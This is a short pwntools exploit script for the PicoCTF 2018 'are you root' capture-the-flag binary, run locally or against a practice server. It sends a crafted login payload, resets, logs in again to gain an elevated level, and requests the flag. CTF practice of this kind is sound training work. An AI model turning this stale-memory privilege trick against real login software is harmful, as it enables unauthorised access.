from pwn import *
from sys import argv
context(os='linux', arch='amd64', log_level='debug')
binary = './PicoCTF_2018_are_you_root'
context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',25778) if argv[1] == 'r' else process(binary)

payload = b'a'*0x8 + p64(5)
io.sendlineafter(b'>',b'login ' + payload)

io.sendlineafter(b'>',b'reset')

io.sendlineafter(b'>',b'login jy')

io.sendlineafter(b'>',b'get-flag')

io.interactive()